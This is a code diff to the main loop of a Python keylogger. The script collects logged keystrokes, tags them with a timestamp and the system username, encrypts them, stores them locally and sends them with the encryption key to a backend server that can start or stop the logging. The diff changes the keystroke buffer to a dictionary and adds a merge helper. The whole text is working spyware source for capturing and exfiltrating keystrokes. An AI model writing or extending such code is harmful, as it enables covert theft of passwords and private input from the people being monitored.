@@ -8,6 +8,11 @@ from encryption import Encryptor
 import base64
 from systeminfo import get_system_info
 from backend_notifier import BackendNotifier
+def merge(a,b):
+    c = {}
+    for key in a | b:
+        c[key] = list(a.get(key, []) + b.get(key, []))
+    return c
 
 def main():
     backendurl = "http://127.0.0.1:5000"
@@ -22,11 +27,12 @@ def main():
                                                                                       # and checks whether to start or stop
 
 
-    buffer = []
+    buffer = {}
     backend_notifier.im_alive()                                                      # notify the backend the script is ready to start
     try:
         while True:
             if backend_notifier.disabled():
+                service.stop_logging()
                 sys.exit()
             status = backend_notifier.start_or_stop()                                # check if approval is granted or denied
             if status:
@@ -34,12 +40,11 @@ def main():
                 service.start_logging()
                 time.sleep(10)                                                       # Choose here how many seconds to wait between sending
                 keys = service.get_logged_keys()
-                # print(keys)
                 if keys:
-                    buffer.extend(keys)
+                    buffer = merge(buffer,keys)
 
                 if buffer:
-                    data = ''.join(buffer)
+                    data = " | ".join(f"{k}: {', '.join(v)}" for k, v in buffer.items())
                     timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                     data = f"[{timestamp}] \n [user name: {Systeminfo["username"]}] \n{data}"
                     encrypted_bytes = encryptor.encrypt(data)                          # Encrypt using your Encryptor
@@ -48,7 +53,7 @@ def main():
                     writer.write_data(encrypted_b64)                                   # write locally encoded data
                     sender.send_data(encrypted_b64,Systeminfo,encryption_key)          # send the encoded data to backend
 
-                    buffer = []                                                        # clear the buffer
+                    buffer = {}                                                        # clear the buffer
             else:
                 print("im stopping")
                 service.stop_logging()
@@ -57,7 +62,7 @@ def main():
 
     except KeyboardInterrupt:
         if buffer:
-            data = ''.join(buffer)
+            data = " | ".join(f"{k}: {', '.join(v)}" for k, v in buffer.items())
             timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
             data = f"[{timestamp}] \n [user name: {Systeminfo["username"]}] \n{data}"
             encrypted_bytes = encryptor.encrypt(data)                          # Encrypt using your Encryptor
